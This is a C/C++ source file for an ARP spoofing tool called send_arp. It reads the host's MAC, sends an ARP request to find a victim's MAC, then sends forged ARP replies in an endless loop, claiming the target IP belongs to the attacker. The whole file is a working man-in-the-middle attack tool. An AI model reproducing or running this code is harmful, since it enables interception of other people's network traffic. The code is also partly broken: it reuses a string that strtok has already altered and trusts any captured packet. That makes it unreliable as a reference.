#include <pcap.h>
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <net/if.h>

unsigned char *mac;
unsigned char arp_packet[64]={0,};

struct L2_header{
    uint8_t dst_MAC[6];
    uint8_t src_MAC[6];
    unsigned short ether_type;
};

void usage() {
    printf("syntax: send_arp <interface> <sender_ip> <target_ip>\n");
    printf("sample: send_arp wlan0 1.1.1.1 2.2.2.2\n");
}

void getAttackerMac(char *i){
       int s = socket(AF_INET, SOCK_DGRAM, 0);
       if(s < 0) perror("socket fail");

       struct ifreq ifr;
       strncpy(ifr.ifr_name, i, IFNAMSIZ);

       if(ioctl(s, SIOCGIFHWADDR, &ifr) < 0)
           perror("ioctl fail");

       mac = reinterpret_cast<unsigned char *>(ifr.ifr_hwaddr.sa_data);
       close(s);
}

int main(int argc, char* argv[]) {
    if (argc != 4) {
        usage();
        return -1;
    }

    char* dev = argv[1]; //network interface name
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
    if (handle == NULL) {
    fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
        return -1;
    }

  getAttackerMac(argv[1]);

  memset(arp_packet, 0, sizeof(arp_packet));
  //sender MAC find
  for(int i=0;i<6;i++)
    arp_packet[i]=0xFF;

  for(int i=6;i<12;i++)
      arp_packet[i]=mac[i-6];

  arp_packet[12]=0x08;
  arp_packet[13]=0x06;

  arp_packet[14]=0x00;
  arp_packet[15]=0x01;
  arp_packet[16]=0x08;
  arp_packet[17]=0x00;
  arp_packet[18]=0x06;
  arp_packet[19]=0x04;

  arp_packet[20]=0x00;
  arp_packet[21]=0x01;

  for(int i=22;i<28;i++)
      arp_packet[i]=mac[i-22];

  arp_packet[28]=0;
  arp_packet[29]=0;
  arp_packet[30]=0;
  arp_packet[31]=0;

  for(int i=32;i<38;i++)
    arp_packet[i]=0x00;

  char *ptr = strtok( argv[2], ".");
  int j=38;

  while (ptr != NULL){
      arp_packet[j]=atoi(ptr);
      j++;
      ptr = strtok(NULL, ".");
  }

  if(pcap_sendpacket(handle, arp_packet ,sizeof(arp_packet))!=0)
    printf("error\n");

  struct pcap_pkthdr* header;
  const u_char* packet;

  //time, length info
  int res = pcap_next_ex(handle, &header, &packet);

  struct L2_header *h2 = (L2_header *)packet;

  //make arp spoofing packet
  memset(arp_packet, 0, sizeof(arp_packet));

  for(int i=0;i<6;i++)
    arp_packet[i]=h2->src_MAC[i];
  for(int i=6;i<12;i++)
      arp_packet[i]=h2->dst_MAC[i-6];

  arp_packet[12]=0x08;
  arp_packet[13]=0x06;

  arp_packet[14]=0x00;
  arp_packet[15]=0x01;
  arp_packet[16]=0x08;
  arp_packet[17]=0x00;
  arp_packet[18]=0x06;
  arp_packet[19]=0x04;

  arp_packet[20]=0x00;
  arp_packet[21]=0x02;

  //sender mac
  for(int i=22;i<28;i++)
      arp_packet[i]=h2->dst_MAC[i-22];
  //sender IP
  ptr = strtok(argv[3], ".");
  j=28;
  while (ptr != NULL){
       arp_packet[j]=atoi(ptr);
       j++;
       ptr = strtok(NULL, ".");
  }

  //target mac
  for(int i=32;i<38;i++)
    arp_packet[i]=h2->src_MAC[i-32];

  //targe IP
   ptr = strtok( argv[2], ".");
   j=38;
   while (ptr != NULL){
        arp_packet[j]=atoi(ptr);
        j++;
        ptr = strtok(NULL, ".");
   }
  //packet send
  while(1){
      if(pcap_sendpacket(handle, arp_packet ,sizeof(arp_packet))!=0)
        printf("error\n");
  }
  pcap_close(handle);
  return 0;

}
